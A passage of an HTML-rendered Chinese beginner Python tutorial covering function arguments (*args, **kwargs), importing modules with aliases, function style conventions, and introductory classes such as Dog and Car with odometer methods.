class="string">"""</span></span><br><span class="line"><span class="string">    模拟打印每个设计，直到没有未打印的设计为止</span></span><br><span class="line"><span class="string">    打印每个设计后，都将其移到列表completed_models中</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">while</span> unprinted_designs:</span><br><span class="line">        current_design = unprinted_designs.pop()</span><br><span class="line">        <span class="comment"># 模拟根据设计制作3D打印模型的过程</span></span><br><span class="line">        print(<span class="string">"Printing model: "</span> + current_design)</span><br><span class="line">        completed_models.append(current_design)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_completed_models</span><span class="params">(completed_models)</span>:</span></span><br><span class="line">    <span class="string">"""显示打印好的所有模型"""</span></span><br><span class="line">    print(<span class="string">"\nThe following models have been printed:"</span>)</span><br><span class="line">    <span class="keyword">for</span> completed_model <span class="keyword">in</span> completed_models:</span><br><span class="line">        print(completed_model)</span><br><span class="line">unprinted_designs = [<span class="string">'iphone case'</span>, <span class="string">'robot pendant'</span>, <span class="string">'dodecahedron'</span>]</span><br><span class="line">completed_models = []</span><br><span class="line">print_models(unprinted_designs, completed_models)</span><br><span class="line">show_completed_models(completed_models)</span><br></pre></td></tr></table></figure></p><p><code>Printing model: dodecahedron</code><br><code>Printing model: robot pendant</code><br><code>Printing model: iphone case</code></p><p><code>The following models have been printed:</code><br><code>dodecahedron</code><br><code>robot pendant</code><br><code>iphone case</code></p><p><strong>禁止函数修改列表</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_models(unprinted_designs[:], completed_models)</span><br></pre></td></tr></table></figure><p><strong>传递任意数量的实参</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pizza</span><span class="params">(*toppings)</span>:</span></span><br><span class="line">    <span class="string">"""概述要制作的比萨"""</span></span><br><span class="line">    print(<span class="string">"\nMaking a pizza with the following toppings:"</span>)</span><br><span class="line">    <span class="keyword">for</span> topping <span class="keyword">in</span> toppings:</span><br><span class="line">        print(<span class="string">"- "</span> + topping)</span><br><span class="line">make_pizza(<span class="string">'pepperoni'</span>)</span><br><span class="line">make_pizza(<span class="string">'mushrooms'</span>, <span class="string">'green peppers'</span>, <span class="string">'extra cheese'</span>)</span><br></pre></td></tr></table></figure></p><p><code>Making a pizza with the following toppings:</code><br><code>- pepperoni</code></p><p><code>Making a pizza with the following toppings:</code><br><code>- mushrooms</code><br><code>- green peppers</code><br><code>- extra cheese</code></p><p>形参名*toppings 中的星号让Python创建一个名为toppings 的空元组，并将收到的所有值都封装到这个元组中。函数体内的print 语句通过生成输出来证明Python能够处理使用一个值调用函数的情形，也能处理使用三个值来调用函数的情形。它以类似的方式处理不同的调用，注意，Python将实参封装到一个元组中，即便函数只收到一个值也如此：</p><p><strong>结合使用位置实参和任意数量实参</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pizza</span><span class="params">(size, *toppings)</span>:</span></span><br><span class="line">    <span class="string">"""概述要制作的比萨"""</span></span><br><span class="line">    print(<span class="string">"\nMaking a "</span> + str(size) +</span><br><span class="line">          <span class="string">"-inch pizza with the following toppings:"</span>)</span><br><span class="line">    <span class="keyword">for</span> topping <span class="keyword">in</span> toppings:</span><br><span class="line">        print(<span class="string">"- "</span> + topping)</span><br><span class="line">make_pizza(<span class="number">16</span>, <span class="string">'pepperoni'</span>)</span><br><span class="line">make_pizza(<span class="number">12</span>, <span class="string">'mushrooms'</span>, <span class="string">'green peppers'</span>, <span class="string">'extra cheese'</span>)</span><br></pre></td></tr></table></figure><p><code>Making a 16-inch pizza with the following toppings:</code><br><code>- pepperoni</code></p><p><code>Making a 12-inch pizza with the following toppings:</code><br><code>- mushrooms</code><br><code>- green peppers</code><br><code>- extra cheese</code></p><p><strong>使用任意数量的关键字实参</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_profile</span><span class="params">(first, last, **user_info)</span>:</span></span><br><span class="line">    <span class="string">"""创建一个字典，其中包含我们知道的有关用户的一切"""</span></span><br><span class="line">    profile = &#123;&#125;</span><br><span class="line">    profile[<span class="string">'first_name'</span>] = first</span><br><span class="line">    profile[<span class="string">'last_name'</span>] = last</span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> user_info.items():</span><br><span class="line">        profile[key] = value</span><br><span class="line">    <span class="keyword">return</span> profile</span><br><span class="line">user_profile = build_profile(<span class="string">'albert'</span>, <span class="string">'einstein'</span>,</span><br><span class="line">                            location=<span class="string">'princeton'</span>,</span><br><span class="line">                            field=<span class="string">'physics'</span>)</span><br><span class="line">print(user_profile)</span><br></pre></td></tr></table></figure><p><code>{&#39;first_name&#39;: &#39;albert&#39;, &#39;last_name&#39;: &#39;einstein&#39;, &#39;location&#39;: &#39;princeton&#39;, &#39;field&#39;: &#39;physics&#39;}</code></p><p>函数build_profile() 的定义要求提供名和姓，同时允许用户根据需要提供任意数量的名称—值对。形参**user_info 中的两个星号让Python创建一个名为user_info 的空字典，并将收到的所有名称—值对都封装到这个字典中。在这个函数中，可以像访问其他字典那样访问user_info 中的名称—值对。在build_profile() 的函数体内，我们创建了一个名为profile 的空字典，用于存储用户简介。在❶处，我们将名和姓加入到这个字典中，因为我们总是会从用户那里收到这两项信息。在❷处，我们遍历字典user_info 中的键—值对，并将每个键—值对都加入到字典profile 中。最后，我们将字典profile 返回给函数调用行。我们调用build_profile() ，向它传递名（’albert’ ）、姓（’einstein’ ）和两个键—值对（location=’princeton’ 和field=’physics’ ），并将返回的profile 存储在变量user_profile 中，再打印这个变量：</p><p><strong>将函数存储在模块中</strong><br><strong>导入整个模块</strong></p><p>要让函数是可导入的，得先创建模块。模块 是扩展名为.py的文件，包含要导入到程序中的代码。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pizza</span><span class="params">(size, *toppings)</span>:</span></span><br><span class="line"><span class="string">"""概述要制作的比萨"""</span></span><br><span class="line">print(<span class="string">"\nMaking a "</span> + str(size) +</span><br><span class="line"><span class="string">"-inch pizza with the following toppings:"</span>)</span><br><span class="line"><span class="keyword">for</span> topping <span class="keyword">in</span> toppings:</span><br><span class="line">print(<span class="string">"- "</span> + topping)</span><br></pre></td></tr></table></figure></p><p>我们在pizza.py所在的目录中创建另一个名为making_pizzas.py的文件，这个文件导入刚创建的模块，再调用make_pizza() 两次：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pizza</span><br><span class="line">pizza.make_pizza(<span class="number">16</span>, <span class="string">'pepperoni'</span>)</span><br><span class="line">pizza.make_pizza(<span class="number">12</span>, <span class="string">'mushrooms'</span>, <span class="string">'green peppers'</span>, <span class="string">'extra cheese'</span>)</span><br></pre></td></tr></table></figure></p><p><code>Making a 16-inch pizza with the following toppings:</code><br><code>- pepperoni</code></p><p><code>Making a 12-inch pizza with the following toppings:</code><br><code>- mushrooms</code><br><code>- green peppers</code><br><code>- extra cheese</code></p><p><strong>导入特定的函数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> module_name <span class="keyword">import</span> function_name</span><br><span class="line"><span class="keyword">from</span> module_name <span class="keyword">import</span> function_0, function_1, function_2</span><br></pre></td></tr></table></figure><p>对于前面的making_pizzas.py示例，如果只想导入要使用的函数，代码将类似于下面这样：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pizza <span class="keyword">import</span> make_pizza</span><br><span class="line">make_pizza(<span class="number">16</span>, <span class="string">'pepperoni'</span>)</span><br><span class="line">make_pizza(<span class="number">12</span>, <span class="string">'mushrooms'</span>, <span class="string">'green peppers'</span>, <span class="string">'extra cheese'</span>)</span><br></pre></td></tr></table></figure></p><p>若使用这种语法，调用函数时就无需使用句点。由于我们在import 语句中显式地导入了函数make_pizza() ，因此调用它时只需指定其名称。</p><p><strong>使用as 给函数指定别名</strong></p><p>如果要导入的函数的名称可能与程序中现有的名称冲突，或者函数的名称太长，可指定简短而独一无二的别名 ——函数的另一个名称，类似于外号。要给函数指定这种特殊外号，需要在导入它时这样做。<br>下面给函数make_pizza() 指定了别名mp() 。这是在import 语句中使用make_pizza as mp 实现的，关键字as 将函数重命名为你提供的别名：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pizza <span class="keyword">import</span> make_pizza <span class="keyword">as</span> mp</span><br><span class="line">mp(<span class="number">16</span>, <span class="string">'pepperoni'</span>)</span><br><span class="line">mp(<span class="number">12</span>, <span class="string">'mushrooms'</span>, <span class="string">'green peppers'</span>, <span class="string">'extra cheese'</span>)</span><br></pre></td></tr></table></figure></p><p>指定别名的通用语法如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> module_name <span class="keyword">import</span> function_name <span class="keyword">as</span> fn</span><br></pre></td></tr></table></figure></p><p><strong>使用as 给模块指定别名</strong></p><p>你还可以给模块指定别名。通过给模块指定简短的别名（如给模块pizza 指定别名p ），让你能够更轻松地调用模块中的函数。相比于pizza.make_pizza()，p.make_pizza() 更为简洁：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pizza <span class="keyword">as</span> p</span><br><span class="line">p.make_pizza(<span class="number">16</span>, <span class="string">'pepperoni'</span>)</span><br><span class="line">p.make_pizza(<span class="number">12</span>, <span class="string">'mushrooms'</span>, <span class="string">'green peppers'</span>, <span class="string">'extra cheese'</span>)</span><br></pre></td></tr></table></figure></p><p>给模块指定别名的通用语法如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> module_name <span class="keyword">as</span> mn</span><br></pre></td></tr></table></figure></p><p><strong>导入模块中的所有函数</strong></p><p>使用星号（* ）运算符可让Python导入模块中的所有函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pizza <span class="keyword">import</span> *</span><br><span class="line">make_pizza(<span class="number">16</span>, <span class="string">'pepperoni'</span>)</span><br><span class="line">make_pizza(<span class="number">12</span>, <span class="string">'mushrooms'</span>, <span class="string">'green peppers'</span>, <span class="string">'extra cheese'</span>)</span><br></pre></td></tr></table></figure></p><p>import 语句中的星号让Python将模块pizza 中的每个函数都复制到这个程序文件中。由于导入了每个函数，可通过名称来调用每个函数，而无需使用句点表示法。然而，使用并非自己编写的大型模块时，最好不要采用这种导入方法：如果模块中有函数的名称与你的项目中使用的名称相同，可能导致意想不到的结果：Python可能遇到多个名称相同的函数或变量，进而覆盖函数，而不是分别导入所有的函数。<br>最佳的做法是，要么只导入你需要使用的函数，要么导入整个模块并使用句点表示法。这能让代码更清晰，更容易阅读和理解。这里之所以介绍这种导入方法，只是想让你在阅读别人编写的代码时，如果遇到类似于下面的import 语句，能够理解它们：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> module_name <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><p><strong>函数编写指南</strong></p><p>编写函数时，需要牢记几个细节：</p><ul><li><p>应给函数指定描述性名称，且只在其中使用小写字母和下划线。描述性名称可帮助你和别人明白代码想要做什么。给模块命名时也应遵循上述约定。</p></li><li><p>每个函数都应包含简要地阐述其功能的注释，该注释应紧跟在函数定义后面，并采用文档字符串格式。文档良好的函数让其他程序员只需阅读文档字符串中的描述就能够使用它：他们完全可以相信代码如描述的那样运行；只要知道函数的名称、需要的实参以及返回值的类型，就能在自己的程序中使用它。</p></li><li><ul><li>给形参指定默认值时，等号两边不要有空格：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">function_name</span><span class="params">(parameter_0, parameter_1=<span class="string">'default value'</span>)</span></span></span><br></pre></td></tr></table></figure></li></ul></li></ul><p>对于函数调用中的关键字实参，也应遵循这种约定：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function_name(value_0, parameter_1=<span class="string">'value'</span>)</span><br></pre></td></tr></table></figure></p><ul><li><p>PEP 8（<a href="https://www.python.org/dev/peps/pep-0008/" target="_blank" rel="noopener">https://www.python.org/dev/peps/pep-0008/</a> ）建议代码行的长度不要超过79字符，这样只要编辑器窗口适中，就能看到整行代码。如果形参很多，导致函数定义的长度超过了79字符，可在函数定义中输入左括号后按回车键，并在下一行按两次Tab键，从而将形参列表和只缩进一层的函数体区分开来。</p></li><li><p>大多数编辑器都会自动对齐后续参数列表行，使其缩进程度与你给第一个参数列表行指定的缩进程度相同：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">function_name</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">parameter_0, parameter_1, parameter_2,</span></span></span><br><span class="line"><span class="function"><span class="params">parameter_3, parameter_4, parameter_5)</span>:</span></span><br><span class="line">function body...</span><br></pre></td></tr></table></figure></li><li><p>如果程序或模块包含多个函数，可使用两个空行将相邻的函数分开，这样将更容易知道前一个函数在什么地方结束，下一个函数从什么地方开始。</p></li><li><p>所有的import 语句都应放在文件开头，唯一例外的情形是，在文件开头使用了注释来描述整个程序。</p></li></ul><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>面向对象编程 是最有效的软件编写方法之一。在面向对象编程中，你编写表示现实世界中的事物和情景的类，并基于这些类来创建对象。编写类时，你定义一大类对象都有的通用行为。</p><p>基于类创建对象 时，每个对象都自动具备这种通用行为，然后可根据需要赋予每个对象独特的个性。</p><p>使用面向对象编程可模拟现实情景，其逼真程度达到了令你惊讶的地步。</p><p>根据类来创建对象被称为实例化 ，这让你能够使用类的实例。</p><p>** 创建和使用类</p><p>使用类几乎可以模拟任何东西。下面来编写一个表示小狗的简单类Dog ——它表示的不是特定的小狗，而是任何小狗。对于大多数宠物狗，我们都知道些什么呢？它们都有名字和年龄；我们还知道，大多数小狗还会蹲下和打滚。由于大多数小狗都具备上述两项信息（名字和年龄）和两种行为（蹲下和打滚），我们的Dog 类将包含它们。</p><p><strong>创建Dog类</strong></p><p>根据Dog 类创建的每个实例都将存储名字和年龄。我们赋予了每条小狗蹲下（sit() ）和打滚（roll_over() ）的能力：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""一次模拟小狗的简单尝试"""</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></span><br><span class="line">        <span class="string">"""初始化属性name和age"""</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sit</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""模拟小狗被命令时蹲下"""</span></span><br><span class="line">        print(self.name.title() + <span class="string">" is now sitting."</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">roll_over</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""模拟小狗被命令时打滚"""</span></span><br><span class="line">        print(self.name.title() + <span class="string">" rolled over!"</span>)</span><br></pre></td></tr></table></figure><p>根据约定，在Python中，首字母大写的名称指的是类。这个类定义中的括号是空的，因为我们要从空白创建这个类。</p><p><strong>方法<strong>init</strong>()</strong></p><p>类中的函数称为方法 ；你前面学到的有关函数的一切都适用于方法，就目前而言，唯一重要的差别是调用方法的方式。方法<strong><strong>init</strong>()</strong> 是一个特殊的方法，每当你根据Dog 类创建新实例时，Python都会自动运行它。在这个方法的名称中，开头和末尾各有两个下划线，这是一种约定，旨在避免Python默认方法与普通方法发生名称冲突。</p><p>将方法<strong>init</strong>() 定义成了包含三个形参：self 、name 和age 。在这个方法的定义中，形参self 必不可少，还必须位于其他形参的前面。为何必须在方法定义中包含形参self 呢？因为Python调用这个<strong>init</strong>() 方法来创建Dog 实例时，将自动传入实参self 。每个与类相关联的方法调用都自动传递实参self ，它是一个指向实例本身的引用，让实例能够访问类中的属性和方法。我们创建Dog 实例时，Python将调用Dog 类的方法<strong>init</strong>() 。我们将通过实参向Dog() 传递名字和年龄；self 会自动传递，因此我们不需要传递它。每当我们根据Dog 类创建实例时，都只需给最后两个形参（name 和age）提供值。</p><p>定义的两个变量都有前缀self 。以self 为前缀的变量都可供类中的所有方法使用，我们还可以通过类的任何实例来访问这些变量。self.name = name 获取存储在形参name 中的值，并将其存储到变量name 中，然后该变量被关联到当前创建的实例。self.age = age 的作用与此类似。像这样可通过实例访问的变量称为<strong>属性</strong> 。</p><p>Dog 类还定义了另外两个方法：sit() 和roll_over() 。由于这些方法不需要额外的信息，如名字或年龄，因此它们只有一个形参self 。我们后面将创建的实例能够访问这些方法，换句话说，它们都会蹲下和打滚。当前，sit() 和roll_over() 所做的有限，它们只是打印一条消息，指出小狗正蹲下或打滚。但可以扩展这些方法以模拟实际情况：如果这个类包含在一个计算机游戏中，这些方法将包含创建小狗蹲下和打滚动画效果的代码。如果这个类是用于控制机器狗的，这些方法将引导机器狗做出蹲下和打滚的动作。</p><p><strong>根据类创建实例</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my_dog = Dog(<span class="string">'willie'</span>, <span class="number">6</span>)</span><br><span class="line">print(<span class="string">"My dog's name is "</span> + my_dog.name.title() + <span class="string">"."</span>)</span><br><span class="line">print(<span class="string">"My dog is "</span> + str(my_dog.age) + <span class="string">" years old."</span>)</span><br></pre></td></tr></table></figure><p><code>My dog&#39;s name is Willie.</code><br><code>My dog is 6 years old.</code></p><p><strong>调用方法</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my_dog = Dog(<span class="string">'willie'</span>, <span class="number">6</span>)</span><br><span class="line">my_dog.sit()</span><br><span class="line">my_dog.roll_over()</span><br></pre></td></tr></table></figure></p><p><code>Willie is now sitting.</code><br><code>Willie rolled over!</code></p><p><strong>创建多个实例</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">my_dog = Dog(<span class="string">'willie'</span>, <span class="number">6</span>)</span><br><span class="line">your_dog = Dog(<span class="string">'lucy'</span>, <span class="number">3</span>)</span><br><span class="line">print(<span class="string">"My dog's name is "</span> + my_dog.name.title() + <span class="string">"."</span>)</span><br><span class="line">print(<span class="string">"My dog is "</span> + str(my_dog.age) + <span class="string">" years old."</span>)</span><br><span class="line">my_dog.sit()</span><br><span class="line">print(<span class="string">"\nYour dog's name is "</span> + your_dog.name.title() + <span class="string">"."</span>)</span><br><span class="line">print(<span class="string">"Your dog is "</span> + str(your_dog.age) + <span class="string">" years old."</span>)</span><br><span class="line">your_dog.sit()</span><br></pre></td></tr></table></figure></p><p><code>My dog&#39;s name is Willie.</code><br><code>My dog is 6 years old.</code><br><code>Willie is now sitting.</code></p><p><code>Your dog&#39;s name is Lucy.</code><br><code>Your dog is 3 years old.</code><br><code>Lucy is now sitting.</code></p><h2 id="使用类和实例"><a href="#使用类和实例" class="headerlink" title="使用类和实例"></a>使用类和实例</h2><p><strong>Car 类</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""一次模拟汽车的简单尝试"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model, year)</span>:</span></span><br><span class="line">        <span class="string">"""初始化描述汽车的属性"""</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_descriptive_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""返回整洁的描述性信息"""</span></span><br><span class="line">        long_name = str(self.year) + <span class="string">' '</span> + self.make + <span class="string">' '</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">my_new_car = Car(<span class="string">'audi'</span>, <span class="string">'a4'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_new_car.get_descriptive_name())</span><br></pre></td></tr></table></figure><p><code>2016 Audi A4</code></p><p><strong>给属性指定默认值</strong><br>类中的每个属性都必须有初始值，哪怕这个值是0或空字符串。在有些情况下，如设置默认值时，在方法<strong>init</strong>() 内指定这种初始值是可行的；如果你对某个属性这样做了，就无需包含为它提供初始值的形参。<br>下面来添加一个名为odometer_reading 的属性，其初始值总是为0。我们还添加了一个名为read_odometer() 的方法，用于读取汽车的里程表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model, year)</span>:</span></span><br><span class="line">        <span class="string">"""初始化描述汽车的属性"""</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_descriptive_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        long_name = str(self.year) + <span class="string">' '</span> + self.make + <span class="string">' '</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_odometer</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""打印一条指出汽车里程的消息"""</span></span><br><span class="line">        print(<span class="string">"This car has "</span> + str(self.odometer_reading) + <span class="string">" miles on it."</span>)</span><br><span class="line">my_new_car = Car(<span class="string">'audi'</span>, <span class="string">'a4'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_new_car.get_descriptive_name())</span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure><p><code>2016 Audi A4</code><br><code>This car has 0 miles on it.</code></p><p><strong>修改属性的值</strong><br>可以以三种不同的方式修改属性的值：直接通过实例进行修改；通过方法进行设置；通过方法进行递增（增加特定的值）.</p><ul><li>直接修改属性的值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my_new_car = Car(<span class="string">'audi'</span>, <span class="string">'a4'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_new_car.get_descriptive_name())</span><br><span class="line">my_new_car.odometer_reading = <span class="number">23</span></span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure><p><code>2016 Audi A4</code><br><code>This car has 23 miles on it.</code></p><ul><li>通过方法修改属性的值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, make, model, year)</span>:</span></span><br><span class="line">        <span class="string">"""初始化描述汽车的属性"""</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_descriptive_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        long_name = str(self.year) + <span class="string">' '</span> + self.make + <span class="string">' '</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_odometer</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""打印一条指出汽车里程的消息"""</span></span><br><span class="line">        print(<span class="string">"This car has "</span> + str(self.odometer_reading) + <span class="string">" miles on it."</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update_odometer</span><span class="params">(self, mileage)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        将里程表读数设置为指定的值</span></span><br><span class="line"><span class="string">        禁止将里程表读数往回调</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">            self.odometer_reading = mileage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"You can't roll back an odometer!"</span>)</span><br><span class="line">        </span><br><span class="line">my_new_car = Car(<span class="string">'audi'</span>, <span class="string">'a4'</span>, <span class="number">2016</span>)</span><br><span class="line">print(my_new_car.get_descriptive_name())</span><br><span class="line">my_new_car.update_odometer(<span class="number">23</span>)</span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure><p><code>2016 Audi A4</code><br><code>This car has 23 miles on it.</code></p><ul><li>通过方法对属性的值进行递增</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span 